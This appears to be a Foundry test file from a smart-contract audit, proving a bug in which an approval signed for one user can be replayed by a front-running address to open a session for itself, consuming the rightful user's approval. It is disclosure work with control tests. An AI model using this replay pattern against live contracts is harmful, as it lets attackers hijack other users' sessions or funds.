// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/N1Harness.sol";

/// @title N-1 PoC: Provider Approval User Binding Not Enforced
/// @notice Provider signs an approval INTENDED for Alice. Bob (a different
///         address) front-runs with the exact same approval bytes and opens
///         a session for himself. The contract accepts it because
///         _extractProviderApproval discards the signed user address and
///         openSession never validates user_ against it.
contract N1ApprovalBindingTest is Test {
    N1Harness harness;

    uint256 constant PROVIDER_PK = 0xA11CE;
    address provider;
    address alice = address(0xA11C3);
    address bob = address(0xB0B);

    bytes32 constant BID_ID = keccak256("bid-1");

    function setUp() public {
        harness = new N1Harness();
        provider = vm.addr(PROVIDER_PK);
        harness.registerBid(BID_ID, provider);
    }

    /// @dev Builds approval bytes exactly like the off-chain helper:
    ///      utils/provider-helper.ts encodes (bytes32, uint256, address, uint128)
    ///      = (bidId, chainId, user.address, timestamp)
    function _buildApproval(address forUser) internal view returns (bytes memory) {
        return abi.encode(BID_ID, block.chainid, forUser, uint128(block.timestamp));
    }

    function _signApproval(bytes memory approval) internal view returns (bytes memory sig) {
        bytes32 digest = keccak256(
            abi.encodePacked("\x19Ethereum Signed Message:\n32", keccak256(approval))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PROVIDER_PK, digest);
        sig = abi.encodePacked(r, s, v);
    }

    /// @notice THE BUG: approval signed for Alice is used by Bob.
    function test_N1_bobUsesAlicesApproval() public {
        // 1. Provider signs approval INTENDED for Alice
        bytes memory approvalForAlice = _buildApproval(alice);
        bytes memory sig = _signApproval(approvalForAlice);

        // Sanity: the approval bytes really do encode Alice
        assertEq(harness.decodeApprovedUser(approvalForAlice), alice);

        // 2. Bob front-runs: calls openSession as HIMSELF with ALICE's approval
        vm.prank(bob);
        bytes32 sessionId = harness.openSession(bob, approvalForAlice, sig);

        // 3. BUG DEMONSTRATED: session opened for Bob, not Alice
        assertTrue(sessionId != bytes32(0), "session should open");
        assertEq(harness.userSessions(bob, 0), sessionId, "session recorded for BOB");
        // Alice has NO sessions: accessing index 0 must revert (empty array)
        (bool ok, ) = address(harness).call(
            abi.encodeWithSignature("userSessions(address,uint256)", alice, uint256(0))
        );
        assertTrue(!ok, "alice must have zero sessions");

        // 4. Alice's legitimate attempt now reverts (approval single-use, already consumed)
        vm.prank(alice);
        vm.expectRevert(N1Harness.SessionDuplicateApproval.selector);
        harness.openSession(alice, approvalForAlice, sig);

        emit log_string("N-1 CONFIRMED: Bob opened a session with an approval signed for Alice");
    }

    /// @notice Control: the intended flow (Alice using her own approval) works fine.
    function test_N1_control_aliceUsesOwnApproval() public {
        bytes memory approvalForAlice = _buildApproval(alice);
        bytes memory sig = _signApproval(approvalForAlice);

        vm.prank(alice);
        bytes32 sessionId = harness.openSession(alice, approvalForAlice, sig);

        assertTrue(sessionId != bytes32(0));
        assertEq(harness.userSessions(alice, 0), sessionId);
        emit log_string("CONTROL OK: Alice can use her own approval");
    }

    /// @notice Forged approvals still rejected — only the binding is missing, not signature validation.
    function test_N1_control_forgedSignatureReverts() public {
        bytes memory approvalForAlice = _buildApproval(alice);
        // signed by NOBODY (wrong key) -> must revert
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(0xBAD, keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", keccak256(approvalForAlice))));
        bytes memory badSig = abi.encodePacked(r, s, v);

        vm.prank(bob);
        vm.expectRevert(N1Harness.SessionProviderSignatureMismatch.selector);
        harness.openSession(bob, approvalForAlice, badSig);
        emit log_string("CONTROL OK: forged signatures still rejected");
    }
}
